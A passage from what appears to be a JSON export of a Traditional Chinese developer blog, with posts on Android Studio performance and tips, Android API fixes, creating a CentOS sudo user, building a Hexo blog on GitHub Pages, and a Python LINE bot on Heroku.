開發案子，發現 Android Studio 會常常出現卡頓。\n解決辦法 上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。 因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：\n1  /Applications/Android\\ Studio.app/Contents/bin/studio.vmoptions   在我的電腦上，參數預設是：\n1 2 3 4  -Xms256m -Xmx1280m -XX:ReservedCodeCacheSize=240m -XX:+UseCompressedOops   在修改重要設定檔之前，建議先做備份：\n1 2  cd /Applications/Android\\ Studio.app/Contents/bin/ cp studio.vmoptions studio.vmoptions.bak   以上為 bash 指令，請打開 terminal 輸入。\n第一句是移動到存放 studio.vmoptions 的資料夾底下 第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak\n然後修改 studio.vmoptions 成這樣：\n1 2 3 4  -Xms512m -Xmx2048m -XX:ReservedCodeCacheSize=768m -XX:+UseCompressedOops   如果覺得你記憶體足夠大，可以將 -Xmx 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。","title":"解決 Android Studio 卡頓的問題"},{"content":"最近開始研究 Android Studio，得知一些可以增加開發速度的小技巧，因此在這邊做一下記錄。\nLive Templates Live Templates：程式碼快速補全模板\n這邊列出一些比較常見的 Live Templates，有興趣的人可以自行深入了解。\n newInstance - 在 Fragment 中生成 newInstance 方法 Toast - 生成 Toast.makeText(context, \u0026quot;\u0026quot;, Toast.LENGTH_SHORT).show(); fbc - 生成 findViewById const - 定義一個 android style int 常數 logd - 生成 Log.d(TAG, \u0026quot;\u0026quot;); logm - Log 當前方法名稱和參數 logr - Log 當前方法結果 logt - 當前類生成 log tag psf - public static final sout - 印出一個字串到 System.out soutm - 印出當前類名和方法到 System.out soutp - 印出方法參數和返回值到 System.out visible - 設置 view VISIBLE gone - 設置 view GONE noInstance - private 構造方法  Android Studio 的自動生成 可以使用 Android Studio 自動幫你生成一些程式碼\n \u0026lt;expr\u0026gt;.null 轉換成 if(\u0026lt;expr\u0026gt; == null) \u0026lt;expr\u0026gt;.notnull 轉換成 if(\u0026lt;expr\u0026gt; != null) \u0026lt;expr\u0026gt;.var 轉換成 T name = \u0026lt;expr\u0026gt; \u0026lt;expr\u0026gt;.field 會自動生成一個全局變數 field = \u0026lt;expr\u0026gt; \u0026lt;ArrayExpr\u0026gt;.for 轉換成 for(T item : \u0026lt;Arrayexpr\u0026gt;) \u0026lt;ArrayExpr\u0026gt;.fori 轉換成 for(int i = 0; i \u0026lt; \u0026lt;Arrayexpr\u0026gt;.length; i++) \u0026lt;ArrayExpr\u0026gt;.forr 轉換成 for(int i = \u0026lt;Arrayexpr\u0026gt;.length - 1; i \u0026gt; 0 ; i--)  插件 下面列出一些我正在使用的插件\n  Android Drawable Importer 為了適應所有 Android 螢幕的大小和密度，每個 Android 項目都會包含 drawable 資料夾。任何具備 Android 開發經驗的開發人員都知道，為了支持所有的螢幕尺寸，你必須給每個螢幕類型導入不同的 Drawalbe。Android Drawable Importer 插件能讓這項工作變得更容易。它可以減少導入縮放圖像到 Android 項目所需的工作量。 Android Drawable Importer 添加了一個在不同分辨率導入 Drawble 或縮放指定圖像到定義分辨率的選項。這個插件加速了開發人員的 Drawable 工作。\n  Lifecycle Sorter 可以根據 Activity 或者 fragment 的生命週期對其生命週期方法位置進行先後排序，快捷鍵 Ctrl + alt + K。\n  .ignore 我們都知道在 Git 中想要過濾掉一些不想提交的文件，可以把相應的文件添加到 .gitignore 中，而 .gitignore 這個 Android Studio 插件根據不同的語言來選擇模板，就不用自己在費事添加一些文件了，而且還有自動補全功能，過濾文件再也不要復製檔名了。我們做項目的時候，並不是所有文件都是要提交的，比如構建的 build 資料夾，本地配置文件，每個 Module 生成的 iml 文件，但是我們每次 add，commit 都會不小心把它們添加上去，而 gitignore 就是解決這種痛點的，如果你不想提交的檔案，就可以在創建項目的時候將這個檔案中添加即可，將一些通用的東西屏蔽掉。\n  Android Methods Count 統計 Android 依賴庫中方法的總個數。 (一個 dex 只能接受的 65K 並不是指方法數超過 65K 而報的錯,而是指引用計數超過 65K)\n  jetbrains-wakatime 紀錄在 Android Studio 上的工作時間。\n  Genymotion 好用的 Android 模擬器，原生模擬器不堪用。\n  GsonFormat 快速將 json 字串轉換成一個 Java Bean，免去我們根據 json 字符串手寫對應 Java Bean 的過程。\n  LayoutFormatter 一鍵幫你將你的 XML 文件排版，並調整順序。\n  快捷鍵 完整的快捷键指南\n參考資料  nisrulz/android-tips-tricks Android Studio插件整理 ","permalink":"https://blackmaple.me/android-studio%E6%8A%80%E5%B7%A7%E6%95%B4%E7%90%86/","summary":"\u003cp\u003e最近開始研究 Android Studio，得知一些可以增加開發速度的小技巧，因此在這邊做一下記錄。\u003c/p\u003e","title":"Android Studio 技巧整理"},{"content":" 以 root 身份登錄到你的伺服器。 1  ssh root@server_ip_address      使用 adduser 指令將新用戶添加到你的系統\n將 username 替換為你要創建的用戶\n1  adduser username    使用 passwd 指令更新 user 密碼  1  passwd username    設置 user 的密碼的顯示訊息  1 2 3 4 5  Set password prompts: Changing password for user username. New password: Retype new password: passwd: all authentication tokens updated successfully.     使用 usermod 指令將用戶添加到 wheel 中。\n1  usermod -aG wheel username   默認情況下，在 CentOS 上，wheel 的成員具有 sudo 權限。\n  在 user 上測試 sudo 訪問權限\n 使用該 su 命令切換到新的 user 。  1  su - username    作為 user ，請通過將“sudo”添加到要以超級用戶權限運行的命令來驗證是否可以使用 sudo。  例如，您可以列出根目錄的內容，/ 通常只能由 root 用戶訪問。\n1  sudo ls -la /    第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續。  1 2  Output: [sudo] password for username:   如果您前面操作正確，則使用 sudo 來執行的指令會以 root 權限執行。\n ","permalink":"https://blackmaple.me/how-to-create-a-sudo-user-on-centos-quickstart/","summary":"\u003col\u003e\n\u003cli\u003e以 root 身份登錄到你的伺服器。\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003essh root@server_ip_address\n\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/li\u003e\n\u003c/ol\u003e","title":"如何在 Centos 7 創建一個 Sudo user"},{"content":"遇到問題 最近在寫一個 Singleton 的類別時，遇到需要透過 Resource id 取得 string 的需求，原本想用 context.getString(int resId) 的方式取得，但發現 Context 不適合被 static 成員或類別引用，會導致內存泄露。\nstatic 成員生命週期會隨著 app 開始到結束。 如果引用到 Context、Activity，會導致 Context、Activity 也跟著無法被回收，導致內存泄露。\n解決辦法 使用 Resources.getSystem().getString(int resId) 來取得 String。\n參考資料 https://segmentfault.com/q/1010000008131979 https://stackoverflow.com/questions/3822732/android-getstringr-string-in-static-method\n","permalink":"https://blackmaple.me/%E5%9C%A8-static-method-%E5%8F%96%E5%BE%97-string-resourse/","summary":"\u003ch2 id=\"遇到問題\"\u003e遇到問題\u003c/h2\u003e\n\u003cp\u003e最近在寫一個 Singleton 的類別時，遇到需要透過 Resource id 取得 string 的需求，原本想用 context.getString(int resId) 的方式取得，但發現 Context 不適合被 static 成員或類別引用，會導致內存泄露。\u003c/p\u003e","title":"[Android] 在 static method  中取得 String Resource"},{"content":"從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。\n新方法：\n1  context.getColor(id);   如果要兼容 Android 6 以下的版本，建議使用 Support Library v4 的方法：\n1  ContextCompat.getColor(context, R.color.your_color);   此方法來自官方 JavaDoc 的描述：\n Returns a color associated with a particular resource ID\nStarting in M, the returned color will be styled for the specified Context\u0026rsquo;s theme.\n 這是 ContextCompat.getColor() 的程式碼：\n1 2 3 4 5 6 7  public static final int getColor(Context context, @ColorRes int id) { if (Build.VERSION.SDK_INT \u0026gt;= 23) { return context.getColor(id); } else { return context.getResources().getColor(id); } }   如果不想導入 Support Library v4，可以直接參考上面的寫法。\n","permalink":"https://blackmaple.me/android-getcolor-deprecated/","summary":"\u003cp\u003e從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。\u003c/p\u003e","title":"Android: getColor(int id) deprecated"},{"content":"遇到狀況 java.lang.IllegalStateException: Fragment already added  原因 Fragment 在一些狀況不會正常移除\n原本程式碼 1 2 3 4  FragmentTransaction transaction = getFragmentManager().beginTransaction(); transaction.replace(R.id.fragment_container, newFragment); transaction.addToBackStack(null); transaction.commit();   解決辦法 因為replace有時會出現問題，因此在使用之前先確認Fragment是否被Added。\n1 2 3 4  if(mFragment.isAdded()) { return; //or return false/true, based on where you are calling from }   後來程式碼 1 2 3 4 5 6 7  FragmentTransaction transaction = getFragmentManager().beginTransaction(); if (newFragment.isAdded()) { return; } transaction.replace(R.id.fragment_container, newFragment); transaction.addToBackStack(null); transaction.commit();   ","permalink":"https://blackmaple.me/error-fragment-already-added/","summary":"\u003ch2 id=\"遇到狀況\"\u003e遇到狀況\u003c/h2\u003e\n\u003cpre\u003e\u003ccode\u003ejava.lang.IllegalStateException: Fragment already added\n\u003c/code\u003e\u003c/pre\u003e","title":"[Android] Error：Fragment already added"},{"content":"Notification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。\nAndroid 3.0 以上選擇 Notification Android 3.0 以下選擇 NotificationCompat\n","permalink":"https://blackmaple.me/android-notificationcompat-vs-notification/","summary":"\u003cp\u003eNotification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。\u003c/p\u003e","title":"Android: NotificationCompat 與 Notification 差別"},{"content":"之前使用過 Wordpress 一段時間，但發現了 Hexo 更方便，所以這邊來紀錄一下使用過程。\nHexo 優點  因為建立於本地端，所以可以更方便離線進行編輯 可以不需要一台伺服器 文章編輯使用 Markdown 語法，更方便、通用、容易上手 部署於 GitHub 上，完全零成本 中文兼容性高 可快速搭建優質的部落格  開始之前 建議先了解，cmd 或是 bash 指令 之後所有指令以 \u0026lsquo;$\u0026rsquo; 開頭，皆為 bash 指令 ​ 有任何問題，都歡迎留言詢問唷～\n建制步驟 安裝 Node.js 去 Node.js 官網下載安裝\n安裝 Hexo Git 1  $ npm install hexo-deployer-git --save   安裝 Hexo 使用 npm 來安裝 hexo (須先安裝 Node.js)\n1  $ npm install hexo-cli -g   安裝成功後，輸入以下指令可查看版本\n1  $ hexo version   接下來即可初始化我們的部落格了\n1 2 3  $ hexo init blog # 初始化 blog $ cd blog # 移動到剛創建的 blog 資料夾裡 $ npm install\t# 安裝相關套件   將 Hexo 配置到 GitHub 去 GitHub 官網登入。 新增一個倉庫(Repositories)\n倉庫名稱為 yourname.github.io\n 上面的 yourname 請替換成你 GitHub 的帳號名稱\n 看到這頁代表即可退出\n再來到 blog 資料夾下找一個 _config.yml 的檔案，這是 Hexo 的全域配置文件 開啟之後，拉到檔案最底部，可以看到\n1 2  deploy: type:   將以下資訊對應輸入\n1 2 3 4  deploy: type: git repository: http://github.com/yourname/yourname.github.io.git branch: master    設定中的 \u0026ldquo;:\u0026rdquo; 後一定要有一個空格 將上面的 yourname 改成妳的 GitHub 帳號名稱\n 產生靜態文件後，部署上 GitHub\n1  $ hexo d -g   再來就可以上 https://yourname.github.io/ 查看是否部署成功 成功之後，就可以開始做一些優化和寫文章啦。\n 將上面的 yourname 替換成你 GitHub 的帳號名稱\n Hexo 配置檔介紹 _config.yml 是 hexo 的預設設定黨，其設定是用 yaml 格式編寫。\nyaml 檔裡，\u0026quot;:\u0026ldquo;後一定要有一個空格 下面是 hexo 的預設配置，可以自修改。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # Site title: /標題(會顯示在網頁標題與頁首)/ subtitle: /子標題(顯示在頁首)/ description: /內容描述(給搜尋引擎看的)/ author: /作者(顯示在頁尾)/ language: /網站預設語言(台灣:zh-tw)/ timezone: /時區(預設使用你電腦的時區)/ # URL url: /網站的網域位址/ root: /網站根目錄/ permalink: /文章目錄(預設使用 YYYY\\MM\\DD\\文章名稱)/ # Extensions theme: /網站的佈景主題/ (可以到\u0026#34;https://hexo.io/themes/\u0026#34;下載喜歡的佈景放置到 theme 目錄裡) # Deployment deploy: type: /發佈型態/ 例如(git、heroku、rsync、openshift、ftpsync) repository: /部署位置/ 例如(git@github.com:帳號/REPO名.git) branch: /分支/ 例如(master、gh-pages) message: /部署訊息/   使用 NexT 主題 本站使用主題為 NexT.Pisces 主題。 如何使用，可以參考 官方教學文件，上面寫的很詳細，而且是中文的教學！\n發布文章 創建文章\n1  $ hexo new [postName]   備註：將 [postName] 換成你的文章名稱 (以英文尤佳)\n前往 source / _post 資料夾中，打開 [postName].md 文件，在最下面新增 Markdown 語法的內容。\n修改完後，執行以下指令，就可以將新的變更發佈到部落格上囉！\n1  $ hexo d -g # d = 部署, g = 生成   等一段時間，就可以看到你剛剛打的文章囉！\n如果你要先在本地端看看效果，也可以改成以下指令\n1  $ hexo server   不熟悉 Markdown 的人，可以去看看這篇 Markdown 語法教學\n如果想嘗試編寫 Markdown，或是想找一個好用的Markdown 編輯器，可以嘗試使用 HackMD。\n刪除文章 首先進入到 source / _post 資料夾中，找到 helloworld.md 文件，在本地直接執行刪除。 執行以下指令\n1 2  $ hexo clean # 清除快取檔案和已產生的靜態檔案。 $ hexo d -g # d = deploy, g = generate   等一段時間，就會發現那篇文章已經消失囉！\n使用第三方擴充服務 本站有使用以下第三方服務，有興趣可以去看看。\n DISQUS：評論系統 Local Search：搜尋系統 文章摘要顯示使用：優化主頁文章摘要 不蒜子统计：瀏覽量統計  客製化設定 本站參考了以下幾篇文章，修改了一些顯示效果，有興趣可以看看。\n 修改文章底部的那个带#号的标签 動態背景  登錄搜尋引擎 如果只支援 Google 可以參考這篇 Next+Google Webmaster tools， 如果也想支援百度，可以參考這篇 Hexo+Next主题博客提交百度谷歌收录。\nGitHub 會擋百度爬蟲。如果你建在 GitHub 上，百度會搜尋不到  SEO 優化 可以參考這篇，基于Hexo中Next主题的SEO优化指南。\n強化 Markdown renderer 執行以下指令，將原生 Markdown 改為 Markdown-it\n1 2  $ npm un hexo-renderer-marked --save # 刪除原生 Markdown $ npm i hexo-renderer-markdown-it --save # 安裝 Markdown-it   新增標籤頁 可以參考 NexT 官網的這篇教學 添加「标签」页面。\n新增分類頁 可以參考 NexT 官網的這篇教學 添加「分类」页面。\n新增關於頁 可以參考 NexT 官網的這篇教學 Hexo about页面怎么写 Next关于页面怎么设置。\n性能優化 性能優化最主要的就是壓縮網頁大小，一開始有試過使用大多數人推的 hexo-neat，但結果一直失敗QwQ 因此決定改用 gulp 來做壓縮。\n可以參考這篇： Hexo使用Gulp压缩静态资源\n參考資料 Hexo部落格建立筆記 | SkyLake\u0026rsquo;s Blog Hexo 官方網站 NexT 官方網站\n","permalink":"https://blackmaple.me/hexo-tutorial/","summary":"\u003cp\u003e之前使用過 Wordpress 一段時間，但發現了 Hexo 更方便，所以這邊來紀錄一下使用過程。\u003c/p\u003e","title":"Hexo+GitHub，新手也可以快速建立部落格"},{"content":" 本教學由 北科程式設計研究社 所屬 喜歡這篇教學，可以到我的 Github 上面給我一顆 Star [name=姚韋辰]\n 本教程介紹如何使用 Python LINE Bot SDK 在 Heroku 上架設一個簡單的回話機器人。\n如果您想以另一種語言架設範例 bot，請參閱以下 LINE Bot SDK repositories。\n PHP Go Perl Ruby Python Node.js  在你開始之前 確保您具有以下內容：\n 擁有 Line 帳號 擁有 Heroku 帳戶（您可以免費創建一個）  建立 Heroku 專案   登入 Heroku 後， 在 Heroku 頁面中，點選 New -\u0026gt; Create New App\n  輸入自己喜歡的 App name ，然後點擊 Create app\n  創建 Line Bot 頻道   進入 Line 控制台\n  創建提供者\n  填入提供者名稱\n  點擊 Create\n  點擊 Create Channel\n  填入 Bot 資訊\n  同意 Line 條款，並按 Create\n  選擇剛剛創建的 Bot\n  設定範例機器人 按照以下步驟架設一個回話機器人。\n  下載 範例程式碼\n  進入 Line 控制台，選擇你剛剛創建的機器人\n  開啟 webhook\n  關閉預設罐頭回覆訊息\n  產生 Channel access token\n  取得 Channel access token\n  取得 Channel secret\n  使用編輯器開啟範例程式碼資料夾內的 app.py，將剛剛取得的 channel secret 和 channel access token 填入\n  將程式推到 Heroku 上   下載並安裝 Heroku CLI、Git\n  開啟剛剛下載的範例程式碼資料夾，在路徑上輸入 cmd\n  使用終端或命令行應用程序登錄到 Heroku\n1  heroku login     初始化 git\n1 2  git config --global user.name \u0026#34;你的名字\u0026#34; git config --global user.email 你的信箱   注意：你的名字 和 你的信箱 要換成各自的 名字 和 信箱\n  初始化 git\n1  git init   注意：僅第一次使用時要輸入\n  用 git 將資料夾與 heroku 連接\n1  heroku git:remote -a {HEROKU_APP_NAME}   注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱\n  輸入以下指令，將程式碼推上 Heroku，如果有跳出錯誤請重新輸入\n1 2 3  git add . git commit -m \u0026#34;Add code\u0026#34; git push -f heroku master   每當需要更新 Bot 時，請重新輸入上述指令\n  將 Heroku 與 Line 綁定   進入 Line 控制台，選擇你剛剛創建的 Bot\n  在 webhook URL 中輸入 Heroku 網址\n1  {HEROKU_APP_NAME}.herokuapp.com/callback   注意：{HEROKU_APP_NAME} 是 Heroku 應用的名稱\n  測試範例成果   進入 Line 控制台，選擇你剛剛創建的 Bot\n  通過在控制台的 “Channel settings” 頁面上掃描 QR Code，將您的 Bot 添加到 LINE 的朋友中\n  在 Line 上向您的 Bot 發送文字訊息，並確認它會學你說話\n  錯誤尋找  當程式遇到問題時，可查看日誌以找出錯誤\n 要查看您的 Bot 在 Heroku 的日誌，請按照以下步驟。\n  如果沒登入，請先透過 Heroku CLI 登入\n1  heroku login     顯示 app 日誌\n1  heroku logs --tail --app {HEROKU_APP_NAME}   注意：{HEROKU_APP_NAME} 是上述步驟2中的應用名稱。\n1 2  --tail # 持續打印日誌 --app {HEROKU_APP_NAME} # 指定 App     程式檔案解說  資料夾裡需含有兩份文件來讓你的程式能在 heroku 上運行\n  Procfile：heroku 執行命令，web: {語言} {檔案}，這邊語言為 python，要自動執行的檔案為 app.py，因此我們改成 web: python app.py。 requirements.txt：列出所有用到的套件，heroku 會依據這份文件來安裝需要套件  app.py (主程式) 可透過修改程式裡的 handle_message() 方法內的程式碼來控制機器人的訊息回覆\n新版範例程式碼內附註解 如想更多了解此程式，可以去研究 Git、Python3、Flask 套件、Line bot sdk\n進階操作 官方文件\n回覆訊息 只有當有訊息傳來，才能回覆訊息\n1  line_bot_api.reply_message(reply_token, 訊息物件)   主動傳送訊息 Bot 需要有開啟 push 功能才可以做，否則程式會出錯\n1  line_bot_api.push_message(push_token, 訊息物件)   訊息物件分類 官方文件\n修改範例程式碼中， handle_message() 方法內的程式碼，可實現多種功能\nTextSendMessage （文字訊息） 1 2  message = TextSendMessage(text=\u0026#39;Hello, world\u0026#39;) line_bot_api.reply_message(event.reply_token, message)   ImageSendMessage（圖片訊息） 1 2 3 4 5  message = ImageSendMessage( original_content_url=\u0026#39;https://example.com/original.jpg\u0026#39;, preview_image_url=\u0026#39;https://example.com/preview.jpg\u0026#39; ) line_bot_api.reply_message(event.reply_token, message)   VideoSendMessage（影片訊息） 1 2 3 4 5  message = VideoSendMessage( original_content_url=\u0026#39;https://example.com/original.mp4\u0026#39;, preview_image_url=\u0026#39;https://example.com/preview.jpg\u0026#39; ) line_bot_api.reply_message(event.reply_token, message)   AudioSendMessage（音訊訊息） 1 2 3 4 5  message = AudioSendMessage( original_content_url=\u0026#39;https://example.com/original.m4a\u0026#39;, duration=240000 ) line_bot_api.reply_message(event.reply_token, message)   LocationSendMessage（位置訊息） 1 2 3 4 5 6 7  message = LocationSendMessage( title=\u0026#39;my location\u0026#39;, address=\u0026#39;Tokyo\u0026#39;, latitude=35.65910807942215, longitude=139.70372892916203 ) line_bot_api.reply_message(event.reply_token, message)   StickerSendMessage（貼圖訊息） 1 2 3 4 5  message = StickerSendMessage( package_id=\u0026#39;1\u0026#39;, sticker_id=\u0026#39;1\u0026#39; ) line_bot_api.reply_message(event.reply_token, message)   ImagemapSendMessage （組圖訊息） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  message = ImagemapSendMessage( base_url=\u0026#39;https://example.com/base\u0026#39;, alt_text=\u0026#39;this is an imagemap\u0026#39;, base_size=BaseSize(height=1040, width=1040), actions=[ URIImagemapAction( link_uri=\u0026#39;https://example.com/\u0026#39;, area=ImagemapArea( x=0, y=0, width=520, height=1040 ) ), MessageImagemapAction( text=\u0026#39;hello\u0026#39;, area=ImagemapArea( x=520, y=0, width=520, height=1040 ) ) ] ) line_bot_api.reply_message(event.reply_token, message)   TemplateSendMessage - ButtonsTemplate （按鈕介面訊息） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  message = TemplateSendMessage( alt_text=\u0026#39;Buttons template\u0026#39;, template=ButtonsTemplate( thumbnail_image_url=\u0026#39;https://example.com/image.jpg\u0026#39;, title=\u0026#39;Menu\u0026#39;, text=\u0026#39;Please select\u0026#39;, actions=[ PostbackTemplateAction( label=\u0026#39;postback\u0026#39;, text=\u0026#39;postback text\u0026#39;, data=\u0026#39;action=buy\u0026amp;itemid=1\u0026#39; ), MessageTemplateAction( label=\u0026#39;message\u0026#39;, text=\u0026#39;message text\u0026#39; ), URITemplateAction( label=\u0026#39;uri\u0026#39;, uri=\u0026#39;http://example.com/\u0026#39; ) ] ) ) line_bot_api.reply_message(event.reply_token, message)   TemplateSendMessage - ConfirmTemplate（確認介面訊息） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  message = TemplateSendMessage( alt_text=\u0026#39;Confirm template\u0026#39;, template=ConfirmTemplate( text=\u0026#39;Are you sure?\u0026#39;, actions=[ PostbackTemplateAction( label=\u0026#39;postback\u0026#39;, text=\u0026#39;postback text\u0026#39;, data=\u0026#39;action=buy\u0026amp;itemid=1\u0026#39; ), MessageTemplateAction( label=\u0026#39;message\u0026#39;, text=\u0026#39;message text\u0026#39; ) ] ) ) line_bot_api.reply_message(event.reply_token, message)   TemplateSendMessage - CarouselTemplate 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  message = TemplateSendMessage( alt_text=\u0026#39;Carousel template\u0026#39;, template=CarouselTemplate( columns=[ CarouselColumn( thumbnail_image_url=\u0026#39;https://example.com/item1.jpg\u0026#39;, title=\u0026#39;this is menu1\u0026#39;, text=\u0026#39;description1\u0026#39;, actions=[ PostbackTemplateAction( label=\u0026#39;postback1\u0026#39;, text=\u0026#39;postback text1\u0026#39;, data=\u0026#39;action=buy\u0026amp;itemid=1\u0026#39; ), MessageTemplateAction( label=\u0026#39;message1\u0026#39;, text=\u0026#39;message text1\u0026#39; ), URITemplateAction( label=\u0026#39;uri1\u0026#39;, uri=\u0026#39;http://example.com/1\u0026#39; ) ] ), CarouselColumn( thumbnail_image_url=\u0026#39;https://example.com/item2.jpg\u0026#39;, title=\u0026#39;this is menu2\u0026#39;, text=\u0026#39;description2\u0026#39;, actions=[ PostbackTemplateAction( label=\u0026#39;postback2\u0026#39;, text=\u0026#39;postback text2\u0026#39;, data=\u0026#39;action=buy\u0026amp;itemid=2\u0026#39; ), MessageTemplateAction( label=\u0026#39;message2\u0026#39;, text=\u0026#39;message text2\u0026#39; ), URITemplateAction( label=\u0026#39;uri2\u0026#39;, uri=\u0026#39;http://example.com/2\u0026#39; ) ] ) ] ) ) line_bot_api.reply_message(event.reply_token, message)   TemplateSendMessage - ImageCarouselTemplate 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  message = TemplateSendMessage( alt_text=\u0026#39;ImageCarousel template\u0026#39;, template=ImageCarouselTemplate( columns=[ ImageCarouselColumn( image_url=\u0026#39;https://example.com/item1.jpg\u0026#39;, action=PostbackTemplateAction( label=\u0026#39;postback1\u0026#39;, text=\u0026#39;postback text1\u0026#39;, data=\u0026#39;action=buy\u0026amp;itemid=1\u0026#39; ) ), ImageCarouselColumn( image_url=\u0026#39;https://example.com/item2.jpg\u0026#39;, action=PostbackTemplateAction( label=\u0026#39;postback2\u0026#39;, text=\u0026#39;postback text2\u0026#39;, data=\u0026#39;action=buy\u0026amp;itemid=2\u0026#39; ) ) ] ) ) line_bot_api.reply_message(event.reply_token, message)   ","permalink":"https://blackmaple.me/line-bot-tutorial/","summary":"\u003cblockquote\u003e\n\u003cp\u003e本教學由 \u003cstrong\u003e北科程式設計研究社\u003c/strong\u003e 所屬\n喜歡這篇教學，可以到我的 \u003ca href=\"https://github.com/yaoandy107/line-bot-tutorial\"\u003eGithub\u003c/a\u003e 上面給我一顆 Star\n[name=姚韋辰]\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e本教程介紹如何使用 Python LINE Bot SDK 在 Heroku 上架設一個簡單的回話機器人。\u003c/p\u003e","title":"LineBot+Python，輕鬆建立聊天機器人"}]